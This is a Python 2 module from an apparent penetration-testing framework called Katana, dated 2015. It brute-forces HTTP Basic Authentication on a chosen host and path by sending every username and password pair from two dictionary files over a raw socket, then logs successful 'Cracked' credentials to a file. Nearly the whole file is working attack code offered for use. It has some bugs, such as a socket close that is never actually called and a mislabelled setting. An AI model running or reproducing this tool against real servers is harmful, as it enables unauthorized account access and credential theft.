# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# @KATANA                     #
# Modules   : Brute Force 403 #
# Script by : RedToor         #
# Date      : 27/02/2015      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                 #
from core.design import *     #
from core import help         #
from core import ping         #
d=DESIGN()                    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                   #
import time                   #
import socket                 #
import base64                 #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Default                     #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
defaulthost="127.0.0.1"
defaultport="80"
defaultpach="/"
defaultdic1="core/db/user.dicc"
defaultdic2="core/db/pass.dicc"
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #

def run(para,parb,parc,pard,pare):
	global defaulthost,defaultport,defaultpach,defaultdic1,defaultdic2
	defaulthost=para
	defaultport=parb
	defaultpach=parc
	defaultdic1=pard
	defaultdic2=pare
	httpbt(1)

def httpbt(run):
	try:
		global defaulthost,defaultport,defaultpach,defaultdic1,defaultdic2
		if run!=1:
			actions=raw_input(d.prompt("web/httpbt"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("target","yes","IP or DNS",defaulthost)
			d.descrip("port","no","Port of target",defaultport)
			d.descrip("patch","yes","Folder or dir",defaultpach)
 			d.descrip("dict_1","yes","Dictionary user",defaultdic1)
 			d.descrip("dict_2","yes","Dictionary pass",defaultdic2)
 			print ""
		elif actions[0:10] == "set target":
				defaulthost = actions[11:]
				defaulthost = defaulthost.replace("http://", "")
				d.change("target",defaulthost)
				httpbt(0)
		elif actions[0:8] == "set port":
				defaultport = actions[9:]
				d.change("port",defaultport)
				httpbt(0)
		elif actions[0:9] == "set patch":
				defaultpach = actions[10:]
				d.change("patch",defaultpach)
				httpbt(0)
		elif actions[0:10] == "set dict_1":
				defaultdic1 = actions[11:]
				d.change("dict_1",defaultdic1)
				httpbt(0)
		elif actions[0:10] == "set dict_2":
				defaultdic2 = actions[11:]
				d.change("dict_1",defaultdic2)
				httpbt(0)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				ping.live(defaulthost,defaultport)
				if True:
					red=socket.socket(socket.AF_INET, socket.SOCK_STREAM)      
					red.connect((defaulthost, int(defaultport))) 
					try:
						d.loading()
						try:
							with open(defaultdic1,'r') as user:
								for us in user: 
									try:
										with open(defaultdic2,'r') as passs:
											for ps in passs:
												us=us.replace("\n","")
												ps=ps.replace("\n","")
												red.send("GET "+defaultpach+" HTTP/1.1\r\n")							
												red.send("HOST: "+defaulthost+"\r\n")							
												red.send("Authorization:Basic "+base64.b64encode(us+":"+ps)+"\r\n\r\n")  
												last=red.recv(1000)	
												if last.find("401")<=0:
													log=open('core/logs/logsBruteForce.log','a')
													log.write('\n ===================================== ')
													log.write('\n Module  : BruteForceHTTP')
													log.write('\n Data    : '+time.strftime('%c'))
													log.write('\n target  : '+defaulthost)
													log.write('\n port    : '+defaultport)
													log.write('\n patch   : '+defaultpach)
													log.write('\n Cracked : username : '+us+' , password : '+ps)
													log.close()
													d.sucess(us,ps)
													red.close
													httpbt(0)
											else:
												print " ["+colors[4]+"!"+colors[0]+"] Checking (username="+us+")(password="+ps+")"
												red.close
									except:
										d.filenot(defaultdic2)
										httpbt(0)
						except:
							d.filenot(defaultdic1)
							httpbt(0)
					except:
						d.kbi()
			except:
				d.off()
		else:
			d.nocommand()
	except:
		d.kbi()
		exit()
	httpbt(0)